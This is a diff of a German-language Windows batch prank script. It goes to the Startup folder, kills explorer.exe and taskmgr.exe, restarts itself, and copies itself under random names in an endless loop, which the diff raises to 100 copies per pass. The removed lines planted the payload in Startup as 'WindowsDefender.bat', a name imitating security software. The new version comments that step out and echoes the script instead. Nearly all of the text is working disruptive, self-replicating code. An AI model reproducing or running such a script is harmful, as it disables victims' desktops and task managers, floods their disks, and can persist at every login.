@@ -4,10 +4,12 @@ pause
 echo SICHER!?
 pause
 echo Schade...
+set script = type f.bat | more /page +12 | more /page -19
 Z:
 cd Z:\Start Menu\Programs\Startup\
-set script = "@echo off\n:a\nsetlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION\nset len=20\nset charpool=0123456789QWERTZUIOPASDFGHJKLYXCVBNMqwertzuiopasdfghjklyxcvbnm\nset len_charpool=62\nset gen_str=\nfor /L %%b IN (1, 1, %len%) do (\n  set /A rnd_index=!RANDOM! * %len_charpool% / 32768\n  for /F %%i in ('echo %%charpool:~!rnd_index!^,1%%') do set gen_str=!gen_str!%%i\n)\ntaskkill /im explorer.exe /f\ntaskkill /im taskmgr.exe /f\nstart %~dp0d.bat\ncopy %~dp0d.bat %~dp0\%gen_str%1.bat\ncopy %~dp0d.bat %~dp0\%gen_str%2.bat\ncopy %~dp0d.bat %~dp0\%gen_str%3.bat\ncopy %~dp0d.bat %~dp0\%gen_str%4.bat\ncopy %~dp0d.bat %~dp0\%gen_str%5.bat\ncopy %~dp0d.bat %~dp0\%gen_str%6.bat\ncopy %~dp0d.bat %~dp0\%gen_str%7.bat\ncopy %~dp0d.bat %~dp0\%gen_str%8.bat\ncopy %~dp0d.bat %~dp0\%gen_str%9.bat\ncopy %~dp0d.bat %~dp0\%gen_str%10.bat\ncopy %~dp0d.bat %~dp0\%gen_str%11.bat\ncopy %~dp0d.bat %~dp0\%gen_str%12.bat\ncopy %~dp0d.bat %~dp0\%gen_str%13.bat\ncopy %~dp0d.bat %~dp0\%gen_str%14.bat\ncopy %~dp0d.bat %~dp0\%gen_str%15.bat\ncopy %~dp0d.bat %~dp0\%gen_str%16.bat\ncopy %~dp0d.bat %~dp0\%gen_str%17.bat\ncopy %~dp0d.bat %~dp0\%gen_str%18.bat\ncopy %~dp0d.bat %~dp0\%gen_str%19.bat\ncopy %~dp0d.bat %~dp0\%gen_str%20.bat\ntree /F /A\ngoto \n"
-@echo off
+goto skip
+
+echo @echo off
 :a
 setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
 set len=20
@@ -21,28 +23,16 @@ for /L %%b IN (1, 1, %len%) do (
 taskkill /im explorer.exe /f
 taskkill /im taskmgr.exe /f
 start %~dp0d.bat
-copy %~dp0d.bat %~dp0\%gen_str%1.bat
-copy %~dp0d.bat %~dp0\%gen_str%2.bat
-copy %~dp0d.bat %~dp0\%gen_str%3.bat
-copy %~dp0d.bat %~dp0\%gen_str%4.bat
-copy %~dp0d.bat %~dp0\%gen_str%5.bat
-copy %~dp0d.bat %~dp0\%gen_str%6.bat
-copy %~dp0d.bat %~dp0\%gen_str%7.bat
-copy %~dp0d.bat %~dp0\%gen_str%8.bat
-copy %~dp0d.bat %~dp0\%gen_str%9.bat
-copy %~dp0d.bat %~dp0\%gen_str%10.bat
-copy %~dp0d.bat %~dp0\%gen_str%11.bat
-copy %~dp0d.bat %~dp0\%gen_str%12.bat
-copy %~dp0d.bat %~dp0\%gen_str%13.bat
-copy %~dp0d.bat %~dp0\%gen_str%14.bat
-copy %~dp0d.bat %~dp0\%gen_str%15.bat
-copy %~dp0d.bat %~dp0\%gen_str%16.bat
-copy %~dp0d.bat %~dp0\%gen_str%17.bat
-copy %~dp0d.bat %~dp0\%gen_str%18.bat
-copy %~dp0d.bat %~dp0\%gen_str%19.bat
-copy %~dp0d.bat %~dp0\%gen_str%20.bat
+for /l %x in (1, 1, 100) do (
+  copy %~dp0d.bat %~dp0\!gen_str!%x.bat
+)
 tree /F /A
 goto a
-echo %script% > WindowsDefender.bat
+
+
+:skip
+REM echo %script% > WindowsDefender.bat
 echo Computer ge-Schweinekebabt...
+pause
+echo %script%
 pause
